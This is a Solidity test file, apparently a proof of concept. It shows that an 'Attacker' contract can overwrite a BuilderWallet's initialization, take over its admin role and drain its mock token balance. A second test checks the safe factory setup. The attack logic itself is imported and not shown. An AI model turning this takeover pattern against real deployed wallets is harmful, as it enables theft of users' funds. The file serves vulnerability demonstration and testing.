// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {BuilderFactory, BuilderWallet, MockERC20, Attacker} from "../src/BuilderWalletSlice.sol";

contract BuilderWalletPoC {
    function test_exploit_init_overwrite() public {
        BuilderFactory factory = new BuilderFactory(address(this));
        address legitAdmin = address(0xBEEF);
        address walletAddr = factory.deployBuilder(123, legitAdmin);
        BuilderWallet wallet = BuilderWallet(walletAddr);
        assert(wallet.builderAdmin() == legitAdmin);

        MockERC20 token = new MockERC20();
        token.mint(walletAddr, 100 ether);
        assert(token.balanceOf(walletAddr) == 100 ether);

        Attacker attacker = new Attacker();
        attacker.attack(wallet, address(token));

        assert(wallet.builderAdmin() == address(attacker));
        assert(token.balanceOf(walletAddr) == 0);
        assert(token.balanceOf(address(attacker)) == 100 ether);
    }

    function test_safety_factory_init() public {
        BuilderFactory factory = new BuilderFactory(address(this));
        address legitAdmin = address(0xBEEF);
        address walletAddr = factory.deployBuilder(123, legitAdmin);
        BuilderWallet wallet = BuilderWallet(walletAddr);
        assert(wallet.builderAdmin() == legitAdmin);
    }
}
